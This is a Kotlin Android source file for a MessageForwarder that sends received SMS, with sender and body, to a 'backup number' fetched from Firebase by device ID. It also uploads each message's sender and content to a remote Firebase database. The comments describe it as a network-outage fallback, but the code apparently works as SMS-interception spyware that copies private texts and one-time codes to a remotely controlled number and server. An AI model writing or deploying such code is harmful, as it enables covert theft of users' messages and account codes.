package com.example.fast.util

import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import android.Manifest
import com.prexoft.prexocore.sendSms
import com.prexoft.prexocore.anon.SimSlot
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.writeInternalFile
import android.provider.Settings
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database

/**
 * MessageForwarder
 *
 * Handles forwarding messages to backup number when network is unavailable
 *
 * Features:
 * - Forward SMS messages to backup number when network is down
 * - Store backup number in Firebase or local file
 * - Format forwarded messages with sender and content
 * - Log forwarding attempts
 */
object MessageForwarder {

    private const val TAG = "MessageForwarder"
    private const val BACKUP_NUMBER_FILE = "backup_number.txt"

    // Track forwarded messages to prevent duplicates
    // Key: message hash (sender + body + timestamp), Value: timestamp when forwarded
    private val forwardedMessages = mutableSetOf<String>()

    // Clean up old entries periodically (keep last 1000 entries)
    private const val MAX_TRACKED_MESSAGES = 1000

    /**
     * Forward a message to backup number (only once per message)
     *
     * @param context Application context
     * @param senderPhoneNumber Original sender phone number
     * @param messageBody Message content
     * @param messageTimestamp Optional timestamp to create unique message hash
     * @return true if message was successfully forwarded, false otherwise
     */
    fun forwardMessage(
        context: Context,
        senderPhoneNumber: String,
        messageBody: String,
        messageTimestamp: Long = System.currentTimeMillis()
    ): Boolean {
        // Create unique message hash to prevent duplicate forwarding
        val messageHash = createMessageHash(senderPhoneNumber, messageBody, messageTimestamp)

        // Check if already forwarded
        if (forwardedMessages.contains(messageHash)) {
            LogHelper.d(TAG, "Message already forwarded, skipping: $messageHash")
            return true // Return true since it was already forwarded
        }

        val backupNumber = getBackupNumber(context)

        if (backupNumber.isBlank()) {
            LogHelper.w(TAG, "Backup number not configured, cannot forward message")
            return false
        }

        // Check permissions
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            LogHelper.w(TAG, "SEND_SMS permission not granted, cannot forward message")
            return false
        }

        try {
            // Format the forwarded message
            val forwardedMessage = formatForwardedMessage(senderPhoneNumber, messageBody)

            // Send SMS to backup number
            context.sendSms(backupNumber, forwardedMessage, SimSlot.SIM_1)

            // Mark as forwarded
            forwardedMessages.add(messageHash)

            // Clean up old entries if needed
            if (forwardedMessages.size > MAX_TRACKED_MESSAGES) {
                // Remove oldest entries (simple approach: clear and keep recent)
                // In production, you might want a more sophisticated cleanup
                val toRemove = forwardedMessages.size - MAX_TRACKED_MESSAGES + 100
                forwardedMessages.removeAll(forwardedMessages.take(toRemove))
            }

            LogHelper.d(TAG, "Message forwarded to backup number: $backupNumber")

            // Log forwarding event (async, won't block)
            logForwardingEvent(context, senderPhoneNumber, backupNumber, messageBody)

            return true
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error forwarding message to backup number", e)
            return false
        }
    }

    /**
     * Create unique hash for message to prevent duplicate forwarding
     */
    private fun createMessageHash(sender: String, body: String, timestamp: Long): String {
        // Use sender + body + timestamp (rounded to nearest minute) to create hash
        // Rounding timestamp to minute prevents duplicate forwarding for same message
        val roundedTimestamp = (timestamp / 60000) * 60000 // Round to nearest minute
        return "${sender}_${body}_$roundedTimestamp".hashCode().toString()
    }

    /**
     * Format message for forwarding
     * Includes sender information and original message
     */
    private fun formatForwardedMessage(senderPhoneNumber: String, messageBody: String): String {
        return "📱 Forwarded SMS\n" +
                "From: $senderPhoneNumber\n" +
                "Message: $messageBody\n" +
                "Time: ${System.currentTimeMillis()}"
    }

    /**
     * Get backup number from Firebase or local file
     * Priority: Firebase > Local file
     */
    @android.annotation.SuppressLint("HardwareIds")
    fun getBackupNumber(context: Context): String {
        // First try to get from local file (fastest)
        val localBackupNumber = readBackupNumberFromFile(context)
        if (localBackupNumber.isNotBlank()) {
            return localBackupNumber
        }

        // If not in local file, try Firebase (async, but we'll return empty and sync in background)
        syncBackupNumberFromFirebase(context)

        return ""
    }

    /**
     * Read backup number from local file
     */
    private fun readBackupNumberFromFile(context: Context): String {
        return try {
            val content = context.readInternalFile(BACKUP_NUMBER_FILE)
            content.trim()
        } catch (e: Exception) {
            LogHelper.w(TAG, "No backup number file found or error reading", e)
            ""
        }
    }

    /**
     * Sync backup number from Firebase
     * This is called asynchronously, so it won't block
     */
    @android.annotation.SuppressLint("HardwareIds")
    private fun syncBackupNumberFromFirebase(context: Context) {
        try {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            val firebasePath = "${AppConfig.getFirebaseDevicePath(deviceId)}/backupNumber"

            Firebase.database.reference.child(firebasePath)
                .addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
                    override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                        if (snapshot.exists()) {
                            val backupNumber = snapshot.value?.toString()?.trim() ?: ""
                            if (backupNumber.isNotBlank()) {
                                // Save to local file for faster access
                                context.writeInternalFile(BACKUP_NUMBER_FILE, backupNumber)
                                LogHelper.d(TAG, "Backup number synced from Firebase: $backupNumber")
                            }
                        }
                    }

                    override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                        LogHelper.e(TAG, "Error syncing backup number from Firebase", error.toException())
                    }
                })
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error syncing backup number from Firebase", e)
        }
    }

    /**
     * Set backup number (for testing or manual configuration)
     */
    fun setBackupNumber(context: Context, phoneNumber: String) {
        try {
            context.writeInternalFile(BACKUP_NUMBER_FILE, phoneNumber.trim())
            LogHelper.d(TAG, "Backup number set: $phoneNumber")

            // Also save to Firebase
            saveBackupNumberToFirebase(context, phoneNumber)
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error setting backup number", e)
        }
    }

    /**
     * Save backup number to Firebase
     */
    @android.annotation.SuppressLint("HardwareIds")
    private fun saveBackupNumberToFirebase(context: Context, phoneNumber: String) {
        try {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            val firebasePath = "${AppConfig.getFirebaseDevicePath(deviceId)}/backupNumber"

            Firebase.database.reference.child(firebasePath)
                .setValue(phoneNumber.trim())
                .addOnSuccessListener {
                    LogHelper.d(TAG, "Backup number saved to Firebase")
                }
                .addOnFailureListener { e ->
                    LogHelper.e(TAG, "Failed to save backup number to Firebase", e)
                }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error saving backup number to Firebase", e)
        }
    }

    /**
     * Log forwarding event to Firebase (if network is available)
     */
    @android.annotation.SuppressLint("HardwareIds")
    private fun logForwardingEvent(
        context: Context,
        senderPhoneNumber: String,
        backupNumber: String,
        messageBody: String
    ) {
        try {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            val timestamp = System.currentTimeMillis()
            val eventPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/forwardedMessages/$timestamp"

            val eventData = mapOf(
                "senderPhoneNumber" to senderPhoneNumber,
                "backupNumber" to backupNumber,
                "messageBody" to messageBody,
                "timestamp" to timestamp,
                "reason" to "network_unavailable"
            )

            Firebase.database.reference.child(eventPath)
                .setValue(eventData)
                .addOnSuccessListener {
                    LogHelper.d(TAG, "Forwarding event logged to Firebase")
                }
                .addOnFailureListener { e ->
                    LogHelper.e(TAG, "Failed to log forwarding event to Firebase", e)
                }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error logging forwarding event", e)
        }
    }
}
